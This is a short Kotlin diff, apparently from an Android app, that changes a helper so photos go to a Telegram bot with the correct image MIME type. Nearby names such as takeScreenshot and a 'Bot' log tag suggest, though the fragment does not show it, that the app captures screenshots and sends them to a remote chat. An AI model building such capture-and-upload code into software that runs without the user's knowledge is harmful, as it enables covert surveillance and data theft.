@@ -573,16 +573,27 @@ private suspend fun takeScreenshot() {
         } catch (e: Exception) { Log.e("Bot", "SendMsg Error", e) }
     }
 
-    private suspend fun sendTelegramPhoto(file: File) {
-        try {
-            val body = MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart("chat_id", CHAT_ID)
-                .addFormDataPart("photo", file.name, file.asRequestBody("image/jpeg".toMediaTypeOrNull()))
-                .build()
-            client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").post(body).build()).execute()
-        } catch (e: Exception) { Log.e("Bot", "SendPhoto Error", e) }
-    }
+
+
+private suspend fun sendTelegramPhoto(file: File) {
+    try {
+        val mediaType = when (file.extension.lowercase()) {
+            "png" -> "image/png"
+            "webp" -> "image/webp"
+            "gif" -> "image/gif"
+            else -> "image/jpeg"
+        }
+        val body = MultipartBody.Builder()
+            .setType(MultipartBody.FORM)
+            .addFormDataPart("chat_id", CHAT_ID)
+            .addFormDataPart("photo", file.name, file.asRequestBody(mediaType.toMediaTypeOrNull()))
+            .build()
+        client.newCall(Request.Builder().url("https://api.telegram.org/bot$BOT_TOKEN/sendPhoto").post(body).build()).execute()
+    } catch (e: Exception) { Log.e("Bot", "SendPhoto Error", e) }
+}
+    
+
+    
 
     private suspend fun sendTelegramDocument(file: File) {
         try {
